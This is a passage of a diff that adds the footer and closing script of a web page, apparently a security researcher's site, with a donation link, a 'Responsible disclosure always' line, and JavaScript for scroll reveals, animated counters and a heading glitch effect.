+    <a href="https://buymeacoffee.com/androidacid" target="_blank" style="display:inline-block;margin-top:.5rem;color:var(--o);border:1px solid rgba(255,153,0,.3);padding:.25rem .7rem;font-size:.6rem;letter-spacing:.15em">☕ BUY ME A COFFEE</a>
+    <div style="margin-top:.3rem;opacity:.4">Responsible disclosure always</div>
+  </div>
+</footer>
+
+<script>
+// Scroll reveals
+const obs = new IntersectionObserver(es=>es.forEach(e=>{if(e.isIntersecting)e.target.classList.add('in')}),{threshold:.08});
+document.querySelectorAll('.fade').forEach(el=>obs.observe(el));
+
+// Counter animation
+const cObs = new IntersectionObserver(es=>{
+  es.forEach(e=>{
+    if(!e.isIntersecting) return;
+    const el = e.target, target = +el.dataset.target;
+    let cur = 0;
+    const step = Math.ceil(target/25);
+    const t = setInterval(()=>{
+      cur = Math.min(cur+step, target);
+      el.textContent = cur + (cur===target && target>9 ? '+' : '');
+      if(cur>=target) clearInterval(t);
+    }, 40);
+    cObs.unobserve(el);
+  });
+},{threshold:.5});
+document.querySelectorAll('.stat-num[data-target]').forEach(c=>cObs.observe(c));
+
+// Glitch pulse
+const h1 = document.querySelector('h1');
+setInterval(()=>{
+  if(Math.random()<.12){
+    h1.style.transform=`translate(${(Math.random()-.5)*4}px,${(Math.random()-.5)*2}px)`;
+    setTimeout(()=>h1.style.transform='', 90);
+  }
+}, 600);
+</script>
+</body>
+</html>
